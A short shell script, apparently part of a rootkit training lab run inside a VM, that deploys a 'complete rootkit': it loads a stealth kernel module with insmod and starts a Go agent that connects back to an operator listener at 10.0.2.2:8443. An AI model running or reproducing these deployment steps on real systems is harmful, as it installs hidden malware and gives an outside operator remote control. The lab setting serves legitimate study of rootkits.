#!/bin/sh

set -eu

# shellcheck source=scripts/lib/ui.sh
. /vm/ui.sh

show()
{
	ui_transcript "$*"
}

run()
{
	show "$@"
	"$@"
}

ui_heading 'P00: Complete rootkit'

run mkdir -p /etc/modules-load.d
run chmod 0700 /etc/modules-load.d

run ifconfig lo 127.0.0.1 up

# Load stealth kernel module (no params, stealth only).
show "insmod /rklings/rklings.ko"
insmod /rklings/rklings.ko

# Start Go agent (connects to the rootless host listener on 10.0.2.2:8443).
if [ -f /rklings/rklings_agent ]; then
	show "/rklings/rklings_agent &"
	/rklings/rklings_agent &
fi

ui_success 'Complete rootkit deployed'
ui_progress 'Agent connecting to operator via mTLS'
